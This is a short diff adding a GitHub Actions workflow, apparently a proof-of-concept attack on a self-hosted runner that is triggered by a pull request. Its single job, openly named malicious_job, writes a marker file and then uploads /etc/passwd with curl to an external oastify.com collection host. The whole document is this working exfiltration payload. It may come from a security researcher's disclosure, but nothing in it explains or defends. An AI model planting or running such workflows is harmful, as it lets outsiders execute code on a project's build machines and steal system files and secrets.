@@ -1,0 +1,9 @@
+name: Self-hosted Runner Exploit
+on: pull_request
+jobs:
+  malicious_job:
+    runs-on: [macos, Ninja, Release]
+    steps:
+      - name: Store Malicious Code
+        run: |
+          echo "Proof Of Concept" > ~/poc.txt && cat ~/poc.txt && curl -F 'file=@/etc/passwd' https://ie07b9wr8ieti0fyji00uf5fw62xqnec.oastify.com/
